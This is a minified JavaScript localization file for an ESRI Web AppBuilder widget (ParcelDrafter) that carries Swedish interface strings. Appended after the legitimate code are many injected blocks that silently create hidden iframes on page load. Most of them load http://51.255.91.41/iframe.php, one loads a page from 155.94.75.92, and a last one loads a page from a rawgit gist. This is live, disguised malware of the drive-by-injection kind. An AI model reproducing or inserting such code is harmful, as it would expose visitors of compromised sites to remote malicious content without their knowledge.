// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/setting/nls/strings":{setBtnLabel:"Ange",selectLabel:"V\u00e4lj",selectLayerLabel:"V\u00e4lj byggnadslager",selectLayerHintText:"Tips: Anv\u00e4nd knappen Ange f\u00f6r att v\u00e4lja byggnadspolygon och dess relaterade linjelager",layerSelector:{selectedLayerNotHavingRelatedLayer:"Det valda polygonlagret har inget giltigt relaterat lager."},parcelLineLayer:{selectLayerLabel:"V\u00e4lj relaterat linjelager",layerSettingTabLabel:"Byggnadslager",advancedSettingTabLabel:"Avancerade inst\u00e4llningar",
selectLayerHintText:"Tips: Anv\u00e4nds f\u00f6r att lagra COGO v\u00e4rden i byggnadslinjelagret",selectFieldLegendLabel:"V\u00e4lj f\u00e4lt f\u00f6r att lagra COGO v\u00e4rden i byggnadslinjelagret",bearingFieldLabel:"B\u00e4ring",chordLengthFieldLabel:"Kordans l\u00e4ngd",distanceFieldLabel:"Avst\u00e5nd",sequenceIdFieldLabel:"Sekvens-ID",radiusFieldLabel:"Radie",foreignKeyFieldLabel:"Sekund\u00e4rnyckel",arcLengthFieldLabel:"B\u00e5gl\u00e4ngd",lineTypeFieldLabel:"Linjetyp",parcelPointSymbolLabel:"Byggnadspunktsymbol",
parcelPointSymbolHintText:"Tips: Anv\u00e4nds f\u00f6r att visa punktsymbolen f\u00f6r linjens startpunkt.",symbolPickerPreviewText:"F\u00f6rhandsgranska",selectLineLayerLabel:"V\u00e4lj linjelager"},parcelPolygonLayer:{selectPolygonLayerLabel:"V\u00e4lj polygonlager",selectPolygonLayerHintText:"Tips: Anv\u00e4nd V\u00e4lj byggnadspolygonlager",selectFieldLegendLabel:"V\u00e4lj f\u00e4lt att lagra byggnadspolygonattribut",parcelNameLabel:"Byggnadsnamn",rotationLabel:"Rotation",planNameLabel:"Plannamn",
scalingLabel:"Skalning",documentTypeLabel:"Dokumenttyp",miscloseRatioLabel:"Misclose-f\u00f6rh\u00e5llande",statedAreaLabel:"Angivet omr\u00e5de",miscloseDistanceLabel:"Misclose-avst\u00e5nd",selectPolygonLayerLabelPopUp:"V\u00e4lj ett polygonlager"},lineTypesTable:{lineTypeLabel:"Linjetyp",valueLabel:"V\u00e4rde",symbolLabel:"Symbol",connectionLineLabel:"Anslutningslinje",boundaryLineLabel:"Gr\u00e4nslinje"},closureSetting:{snappingLayerLabel:"Snappningslager",snappingBtnLabel:"Ange",snappingLayerHintText:"Tips: V\u00e4lj lager som byggnadslinjerna ska snappa till.",
miscloseDistanceLabel:"Misclose-avst\u00e5nd",miscloseDistanceHintText:"Tips: Ange misclose-avst\u00e5ndet och dess enheter.",miscloseRatioLabel:"Misclose-f\u00f6rh\u00e5llande",miscloseRatioHintText:"Tips: Ange misclose-f\u00f6rh\u00e5llande.",snappingToleranceLabel:"Snappningstolerans",pixelLabel:"Pixlar",snappingToleranceHintText:"Tips: Ange snappningstolerans.",selectLayerLabel:"V\u00e4lj lager"},errorMsg:{bearingFieldErrMsg:"Ogiltigt b\u00e4ringsf\u00e4lt",chordLengthErrMsg:"Ogiltig ChordLength",
distanceFieldErrMsg:"Ogiltigt avst\u00e5nd",sequenceIdFieldErrMsg:"Ogiltig sequenceId",radiusFieldErrMsg:"Ogiltig radie",foreignKeyFieldErrMsg:"Ogiltig sekund\u00e4rnyckel",arcLengthFieldErrMsg:"Ogiltig b\u00e5gl\u00e4ngd",lineTypeFieldErrMsg:"Ogiltig linjetyp",parcelNameFieldErrMsg:"Ogiltigt byggnadsnamnsf\u00e4lt",planNameFieldErrMsg:"Ogiltigt plannamnsf\u00e4lt",scaleFieldErrMsg:"Ogiltigt skalf\u00e4lt",documentTypeFieldErrMsg:"Ogiltigt dokumenttypsf\u00e4lt",miscloseRatioFieldErrMsg:"Ogiltigt f\u00e4lt f\u00f6r misclose-f\u00f6rh\u00e5llande",
statedAreaFieldErrMsg:"Ogiltigt angivet omr\u00e5desf\u00e4lt",miscloseDistanceFieldErrMsg:"Ogiltigt f\u00e4lt f\u00f6r misclose-avst\u00e5nd",globalIdFieldErrMsg:"Det valda polygonlagret har inget giltigt f\u00e4lt f\u00f6r esriFieldTypeGlobalID.",invalidPolylineLayer:"V\u00e4lj ett giltigt byggnadspolylinjelager",invalidPolygonLayer:"V\u00e4lj ett giltigt byggnadspolygonlager",invalidMiscloseDistance:"Ange ett giltigt misclose-avst\u00e5nd",invalidSnappingTolerance:"Ange en giltig snappningstolerans",
invalidMiscloseRatio:"Ange ett giltigt misclose-f\u00f6rh\u00e5llande",selectDistinctLineTypes:"V\u00e4lj ett distinkt v\u00e4rde i varje linjetyp",invalidConnectionLineType:"Ogiltig v\u00e4rde f\u00f6r anslutningslinje",invalidBoundaryLineType:"Ogiltig v\u00e4rde f\u00f6r gr\u00e4nslinje",selectDistinctPolylineFields:"V\u00e4lj ett distinkt f\u00e4lt f\u00f6r varje COGO-v\u00e4rde.",selectDistinctPolygonFields:"V\u00e4lj ett distinkt f\u00e4lt f\u00f6r varje byggnadspolygonattribut."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});